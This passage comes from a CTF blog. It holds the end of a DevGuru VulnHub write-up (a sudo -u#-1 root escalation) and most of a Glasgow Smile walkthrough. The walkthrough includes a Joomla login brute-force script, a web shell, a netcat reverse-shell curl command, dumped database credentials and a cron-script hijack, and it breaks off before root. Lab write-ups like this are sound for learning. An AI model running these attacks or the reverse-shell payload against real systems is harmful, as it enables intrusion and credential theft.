<h3 id="sudo-security-bypass">Sudo Security Bypass</h3>

<p>As we can see the current version of sudo is vulnerable because doesn’t check for the existence of the specified user id and executes with arbitrary user id with the sudo priv -u#-1 returns as 0 which is root’s id.</p>

<p>To bypass these restrictions I was guided in the <a href="https://gtfobins.github.io/gtfobins/sqlite3/#sudo">GTFOBINS</a> article, so I used the following instruction to get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@devguru:~/gitea-repositories/s4rgaz/test.git<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 sqlite3 /dev/null '.shell /bin/sh'</span>
&lt;.git<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 sqlite3 /dev/null '.shell /bin/sh'</span>
<span class="c"># id</span>
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>frank<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>frank<span class="o">)</span>
<span class="c"># python3 -c "import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"</span>
python3 <span class="nt">-c</span> <span class="s2">"import os; os.setuid(0); os.setgid(0); os.system('/bin/bash')"</span>

root@devguru:~/gitea-repositories/s4rgaz/test.git# <span class="nb">cd</span> /root
<span class="nb">cd</span> /root
root@devguru:/root# <span class="nb">ls
ls
</span>msg.txt  root.txt
root@devguru:/root# <span class="nb">cat </span>msg.txt
<span class="nb">cat </span>msg.txt

           Congrats on rooting DevGuru!
  Contact me via Twitter @zayotic to give feedback!


root@devguru:/root# <span class="nb">cat </span>root.txt
<span class="nb">cat </span>root.txt
96440606fb88aa7497cde5a8e68daf8f
</code></pre></div></div>


  
    <h1 class="post-title">VulnHub - Glasgow Smile 1.1</h1>
	<p class="post-date text-bold text-upcase">
	<span>November 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> The machine is designed to be as real-life as possible. Anyway, You will find also a bunch of ctf style challanges, it’s important to have some encryption knowledge.</p>

<p><strong>Author:</strong> mindsflee</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the root.txt flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/glasgow-smile-11,491/">https://www.vulnhub.com/entry/glasgow-smile-11,491/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>An ICMP request detected the target machine on the local network, the script you can find it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.165 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP port scan with nmap revealed two available ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 192.168.179.165 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>An Aggressive scan was performed on the target machine, but this doesn’t reveal much information about the services.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p22</span>,80 192.168.179.165 <span class="nt">-oN</span> nmap/enum-services.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 67:34:48:1f:25:0e:d7:b3:ea:bb:36:11:22:60:8f:a1 <span class="o">(</span>RSA<span class="o">)</span>
|   256 4c:8c:45:65:a4:84:e8:b1:50:77:77:a9:3a:96:06:31 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 09:e9:94:23:60:97:f7:20:cc:ee:d6:c1:9b:da:18:8e <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
</span></code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>As we can see, not much information is found on the main page of the web service.</p>

<p><img src="/assets/images/glasgowsmile/screenshot-1.png" alt="" /></p>

<p>So, I decided to run gobuster to brute force and find hidden web content.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wfuzz <span class="nt">--hc</span> 404 <span class="nt">-c</span> <span class="nt">-z</span> file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://192.168.179.165/FUZZ
...
000006215:   301        9 L      28 W       319 Ch      <span class="s2">"joomla"</span> 
</code></pre></div></div>

<p>The tool found a joomla directory, I accessed it, and it redirected me to its home page.</p>

<p><img src="/assets/images/glasgowsmile/screenshot-2.png" alt="" /></p>

<p>Enumerating joomla I found a possible SQL Injection in one of its components, I tried to exploit it but it wasn’t possible, so I decided to enumerate by other ways. The tool you can dowanload it <a href="https://github.com/rastating/joomlavs">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/joomlavs<span class="nv">$ </span>./joomlavs.rb <span class="nt">-u</span> http://192.168.179.165/joomla/ <span class="nt">-a</span>
...
<span class="o">[</span>+] Name: com_fields - v3.7.0
 |  Location: http://192.168.179.165/joomla/administrator/components/com_fields
 |  Manifest: http://192.168.179.165/joomla/administrator/components/com_fields/fields.xml
 |  Description: COM_FIELDS_XML_DESCRIPTION
 |  Author: Joomla! Project
 |  Author URL: www.joomla.org

<span class="o">[!]</span> Title: Joomla Component Fields - SQLi Remote Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>
 |  Reference: https://www.exploit-db.com/exploits/44358
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="joomla-brute-force-login">Joomla Brute Force Login</h3>

<p>I developed a python script to brute force the login form.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">init</span><span class="p">,</span><span class="n">Fore</span>

<span class="n">init</span><span class="p">()</span>
<span class="n">green</span><span class="o">=</span><span class="n">Fore</span><span class="p">.</span><span class="n">GREEN</span>
<span class="n">gray</span><span class="o">=</span><span class="n">Fore</span><span class="p">.</span><span class="n">LIGHTBLACK_EX</span>
<span class="n">reset</span><span class="o">=</span><span class="n">Fore</span><span class="p">.</span><span class="n">RESET</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>

    <span class="n">url</span><span class="o">=</span><span class="s">"http://192.168.179.165/joomla/administrator/index.php"</span>
    <span class="n">user</span><span class="o">=</span><span class="s">'joomla'</span>

    <span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>

        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="n">token</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"name=(.*)"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
        <span class="n">token</span><span class="o">=</span><span class="n">token</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">:</span><span class="mi">33</span><span class="p">]</span>
        <span class="n">cookies</span><span class="o">=</span><span class="n">r</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="n">get_dict</span><span class="p">()</span>

        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
                <span class="s">'username'</span><span class="p">:</span><span class="n">user</span><span class="p">,</span>
                <span class="s">'passwd'</span><span class="p">:</span><span class="n">password</span><span class="p">,</span>
                <span class="s">'option'</span><span class="p">:</span><span class="s">'com_login'</span><span class="p">,</span>
                <span class="s">'task'</span><span class="p">:</span><span class="s">'login'</span><span class="p">,</span>
                <span class="s">'return'</span><span class="p">:</span><span class="s">'aW5kZXgucGhw'</span><span class="p">,</span>
                <span class="n">token</span><span class="p">:</span><span class="mi">1</span>
                <span class="p">}</span>
        
        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>


    <span class="n">wordlist</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s">"cewl.list"</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>

    <span class="k">for</span> <span class="n">passwd</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
        <span class="k">if</span> <span class="s">'alert-message'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">login</span><span class="p">(</span><span class="n">passwd</span><span class="p">):</span>
            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">green</span><span class="si">}</span><span class="s">[+] </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">passwd</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">reset</span><span class="p">:</span><span class="mi">20</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">gray</span><span class="si">}</span><span class="s">[-] </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">passwd</span><span class="si">}{</span><span class="n">reset</span><span class="p">:</span><span class="mi">20</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">'</span><span class="se">\r</span><span class="s">'</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div></div>

<p>After trying to find the password of several possible users, it ocurred me to create a wordlist with cewl.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>cewl http://192.168.179.165/joomla <span class="nt">-w</span> cewl.list
</code></pre></div></div>

<p>Then, as a last try I used the joomla user to brute force and finally found the password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 jf.py
<span class="o">[</span>+] joomla:Gotham
</code></pre></div></div>

<p>I logged in as joomla.</p>

<p><img src="/assets/images/glasgowsmile/screenshot-3.png" alt="" /></p>

<p>Ones on the dashboard we need to find a way to execute system commands, for this we follow the instructions below.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Extensions <span class="o">&gt;</span> Templates <span class="o">&gt;</span> Styles
</code></pre></div></div>

<p><img src="/assets/images/glasgowsmile/screenshot-4.png" alt="" /></p>

<p>In Styles click on “Beez3” under “Template”.</p>

<p><img src="/assets/images/glasgowsmile/screenshot-5.png" alt="" /></p>

<p>We can edit one of these PHP files, in this case I will enter the web shell in the error.php file.</p>

<p><img src="/assets/images/glasgowsmile/screenshot-6.png" alt="" /></p>

<p>We verify if the command “id” is executed correctly.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl http://192.168.179.165/joomla/templates/beez3/error.php?cmd<span class="o">=</span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div>

<p>To get a shell, first we need to start a netcat listener and run the following curl request.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl http://192.168.179.165/joomla/templates/beez3/error.php?cmd<span class="o">=</span><span class="si">$(</span>php <span class="nt">-r</span> <span class="s2">"echo urlencode('nc 192.168.179.1 443 -e /bin/bash');"</span><span class="si">)</span>
</code></pre></div></div>

<p>To upgrade to a full TTY shell, follow the steps below.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.165] 35862
script <span class="nt">-qc</span> /bin/bash /dev/null
www-data@glasgowsmile:/var/www/html/joomla/templates/beez3<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-vlnp</span> 443
root@kali:~<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-vlnp</span> 443

&lt;www/html/joomla/templates/beez3<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color                 
 164data@glasgowsmile:/var/www/html/joomla/templates/beez3<span class="nv">$ </span><span class="nb">stty </span>rows 39 columns 
www-data@glasgowsmile:/var/www/html/joomla/templates/beez3<span class="err">$</span>
</code></pre></div></div>

<p>Listing the joomla creds to connect to the MySQL database.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@glasgowsmile:/var/www/html/joomla<span class="nv">$ </span><span class="nb">cat </span>configuration.php
...
public <span class="nv">$dbtype</span> <span class="o">=</span> <span class="s1">'mysqli'</span><span class="p">;</span>
        public <span class="nv">$host</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
        public <span class="nv">$user</span> <span class="o">=</span> <span class="s1">'joomla'</span><span class="p">;</span>
        public <span class="nv">$password</span> <span class="o">=</span> <span class="s1">'babyjoker'</span><span class="p">;</span>
        public <span class="nv">$db</span> <span class="o">=</span> <span class="s1">'joomla_db'</span><span class="p">;</span>
        public <span class="nv">$dbprefix</span> <span class="o">=</span> <span class="s1">'jnqcu_'</span><span class="p">;</span>
        public <span class="nv">$live_site</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
        public <span class="nv">$secret</span> <span class="o">=</span> <span class="s1">'fNRyp6KO51013435'</span><span class="p">;</span>
...
</code></pre></div></div>

<p>Listing the MySQL databases.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@glasgowsmile:/var/www/html/joomla<span class="nv">$ </span>mysql <span class="nt">-u</span> joomla <span class="nt">-p</span>
Enter password: 
Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MariaDB connection <span class="nb">id </span>is 3663
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> show databases<span class="p">;</span>
+--------------------+
| Database           |
+--------------------+
| batjoke            |
| information_schema |
| joomla_db          |
| mysql              |
| performance_schema |
+--------------------+
</code></pre></div></div>

<p>Switching to the “batjoke” database and listing its tables.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MariaDB <span class="o">[</span>joomla_db]&gt; use batjoke<span class="p">;</span>
Reading table information <span class="k">for </span>completion of table and column names
You can turn off this feature to get a quicker startup with <span class="nt">-A</span>

Database changed
MariaDB <span class="o">[</span>batjoke]&gt; show tables<span class="p">;</span>
+-------------------+
| Tables_in_batjoke |
+-------------------+
| equipment         |
| taskforce         |
+-------------------+
2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>
</code></pre></div></div>

<p>Retrieving the content of the “taskforce” table.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MariaDB <span class="o">[</span>batjoke]&gt; <span class="k">select</span> <span class="k">*</span> from taskforce<span class="p">;</span>
+----+---------+------------+---------+----------------------------------------------+
| <span class="nb">id</span> | <span class="nb">type</span>    | <span class="nb">date</span>       | name    | pswd                                         |
+----+---------+------------+---------+----------------------------------------------+
|  1 | Soldier | 2020-06-14 | Bane    | <span class="nv">YmFuZWlzaGVyZQ</span><span class="o">==</span>                             |
|  2 | Soldier | 2020-06-14 | Aaron   | <span class="nv">YWFyb25pc2hlcmU</span><span class="o">=</span>                             |
|  3 | Soldier | 2020-06-14 | Carnage | <span class="nv">Y2FybmFnZWlzaGVyZQ</span><span class="o">==</span>                         |
|  4 | Soldier | 2020-06-14 | buster  | <span class="nv">YnVzdGVyaXNoZXJlZmY</span><span class="o">=</span>                         |
|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
|  7 | Soldier | 2020-06-14 | aunt    | <span class="nv">YXVudGlzIHRoZSBmdWNrIGhlcmU</span><span class="o">=</span>                 |
+----+---------+------------+---------+----------------------------------------------+
6 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.002 sec<span class="o">)</span>
</code></pre></div></div>

<p>In the output we can see that the passwords are in base64, we decode rob’s password, since this user exists on the system.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@glasgowsmile:/var/www/html/joomla<span class="nv">$ </span><span class="nb">ls</span> /home/
abner  penguin  rob

www-data@glasgowsmile:/var/www/html/joomla<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/'</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo</span>
???AllIHaveAreNegativeThoughts???
</code></pre></div></div>

<p>I switched to the user rob, in his home directory there is a file called “Abnerineedyourhelp”, that contains a ROT and base64 encoded message.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@glasgowsmile:/var/www/html/joomla<span class="nv">$ </span>su rob
Password:
rob@glasgowsmile:/var/www/html/joomla<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>rob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>rob<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>rob<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>


rob@glasgowsmile:~<span class="nv">$ </span><span class="nb">ls
</span>Abnerineedyourhelp  howtoberoot  user.txt
rob@glasgowsmile:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
JKR[f5bb11acbb957915e421d62e7253d27a]
rob@glasgowsmile:~<span class="nv">$ </span><span class="nb">cat </span>howtoberoot 
  _____ ______   __  _   _    _    ____  ____  _____ ____  
 |_   _|  _ <span class="se">\ \ </span>/ / | | | |  / <span class="se">\ </span> |  _ <span class="se">\|</span>  _ <span class="se">\|</span> ____|  _ <span class="se">\ </span>
   | | | |_<span class="o">)</span> <span class="se">\ </span>V /  | |_| | / _ <span class="se">\ </span>| |_<span class="o">)</span> | | | |  _| | |_<span class="o">)</span> |
   | | |  _ &lt; | |   |  _  |/ ___ <span class="se">\|</span>  _ &lt;| |_| | |___|  _ &lt; 
   |_| |_| <span class="se">\_\|</span>_|   |_| |_/_/   <span class="se">\_\_</span>| <span class="se">\_\_</span>___/|_____|_| <span class="se">\_\</span>

NO HINTS.


rob@glasgowsmile:~<span class="nv">$ </span><span class="nb">cat </span>Abnerineedyourhelp 
Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, <span class="s2">"Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."</span>
Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. <span class="nv">RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ</span><span class="o">==</span>
</code></pre></div></div>

<p>To decode it I used this site <a href="https://gchq.github.io/CyberChef/">CyberCef</a>, as we see, the message is encoded in ROT1.</p>

<p><img src="/assets/images/glasgowsmile/screenshot-7.png" alt="" /></p>

<p>Then we decode abner’s base64 encoded password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rob@glasgowsmile:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA=='</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span> <span class="nb">echo
</span>I33hope99my0death000makes44more8cents00than0my0life0
</code></pre></div></div>

<p>I switched to the user abner.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rob@glasgowsmile:~<span class="nv">$ </span>su abner
Password: 
abner@glasgowsmile:/home/rob<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>abner<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>abner<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>abner<span class="o">)</span>
abner@glasgowsmile:/home/rob<span class="nv">$ </span><span class="nb">cd
</span>abner@glasgowsmile:~<span class="nv">$ </span><span class="nb">ls
</span>info.txt  user2.txt
abner@glasgowsmile:~<span class="nv">$ </span><span class="nb">cat </span>user2.txt 
JKR<span class="o">{</span>0286c47edc9bfdaf643f5976a8cfbd8d<span class="o">}</span>
abner@glasgowsmile:~<span class="nv">$ </span><span class="nb">cat </span>info.txt 
A Glasgow smile is a wound caused by making a <span class="nb">cut </span>from the corners of a victim<span class="s1">'s mouth up to the ears, leaving a scar in the shape of a smile.
The act is usually performed with a utility knife or a piece of broken glass, leaving a scar which causes the victim to appear to be smiling broadly.
The practice is said to have originated in Glasgow, Scotland in the 1920s and 30s. The attack became popular with English street gangs (especially among the Chelsea Headhunters, a London-based hooligan firm, among whom it is known as a "Chelsea grin" or "Chelsea smile").
</span></code></pre></div></div>

<p>In abner’s commands history a zip file called dear_penguis.zip is unzipped, this catches my attention.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>abner@glasgowsmile:~<span class="nv">$ </span><span class="nb">cat</span> .bash_history 
...
unzip .dear_penguins.zip
<span class="nb">cat </span>dear_penguins
<span class="nb">rm </span>dear_penguins
...
</code></pre></div></div>

<p>That file was located in one of the web directories.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>abner@glasgowsmile:~<span class="nv">$ </span>find / <span class="nt">-name</span> <span class="s1">'.dear_penguins.zip'</span> 2&gt;/dev/null 
/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
</code></pre></div></div>

<p>A password is required to unzip the file, I used abner’s password and it unzipped successfully.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>abner@glasgowsmile:~<span class="nv">$ </span>unzip /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip 
Archive:  /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
<span class="o">[</span>/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip] dear_penguins password: 
  inflating: dear_penguins           
abner@glasgowsmile:~<span class="nv">$ </span><span class="nb">ls
</span>dear_penguins  info.txt  user2.txt
abner@glasgowsmile:~<span class="nv">$ </span><span class="nb">cat </span>dear_penguins 
My dear penguins, we stand on a great threshold! It<span class="s1">'s okay to be scared; many of you won'</span>t be coming back. Thanks to Batman, the <span class="nb">time </span>has come to punish all of God<span class="s1">'s children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
</span></code></pre></div></div>

<p>As we can see the unzipped file contains penguin’s password, so I switched to it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>abner@glasgowsmile:~<span class="nv">$ </span>su penguin
Password: 
penguin@glasgowsmile:/home/abner<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>penguin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>penguin<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>penguin<span class="o">)</span>
</code></pre></div></div>

<p>Penguin’s home directory contains a hidden file named “trash_old”.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 332
drwxr--r-- 2 penguin penguin   4096 Jun 16  2020 <span class="nb">.</span>
drwxr-xr-x 5 penguin penguin   4096 Jun 16  2020 ..
<span class="nt">-rwSr-----</span> 1 penguin penguin 315904 Jun 15  2020 find
<span class="nt">-rw-r-----</span> 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
<span class="nt">-rwxr-xr-x</span> 1 penguin root       612 Jun 16  2020 .trash_old
<span class="nt">-rw-r-----</span> 1 penguin penguin     38 Jun 16  2020 user3.txt
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask<span class="nv">$ </span><span class="nb">cat</span> .trash_old 
<span class="c">#/bin/sh</span>

<span class="c">#       (            (              )            (      *    (   (</span>
<span class="c"># (      )\ )   (     )\ ) (      ( /( (  (       )\ ) (  `   )\ ))\ )</span>
<span class="c"># )\ )  (()/(   )\   (()/( )\ )   )\()))\))(   ' (()/( )\))( (()/(()/( (</span>
<span class="c">#(()/(   /(_)((((_)(  /(_)(()/(  ((_)\((_)()\ )   /(_)((_)()\ /(_)/(_)))\</span>
<span class="c"># /(_))_(_))  )\ _ )\(_))  /(_))_  ((__(())\_)() (_)) (_()((_(_))(_)) ((_)</span>
<span class="c">#(_)) __| |   (_)_\(_/ __|(_)) __|/ _ \ \((_)/ / / __||  \/  |_ _| |  | __|</span>
<span class="c">#  | (_ | |__  / _ \ \__ \  | (_ | (_) \ \/\/ /  \__ \| |\/| || || |__| _|</span>
<span class="c">#   \___|____|/_/ \_\|___/   \___|\___/ \_/\_/   |___/|_|  |_|___|____|___|</span>
<span class="c">#</span>

<span class="c">#</span>

 
<span class="nb">exit </span>0
</code></pre></div></div>

<p>Listing the processes we can see that this script is executed, possibly due to a cronjob.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask<span class="nv">$ </span>ps auxwe
...
root       2761  0.0  0.1   2388   696 ?        Ss   23:23   0:00 /bin/sh <span class="nt">-c</span> /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old
...
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="cronjob">Cronjob</h3>

<p>I edited the “trash_old” file, assigning it a netcat reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask<span class="nv">$ </span>vi .trash_old
</code></pre></div></div>

<p><img src="/assets/images/glasgowsmile/screenshot-8.png" alt="" /></p>

<p>We Then set up a netcat listener and wait a moment to receive our root shell.</p>

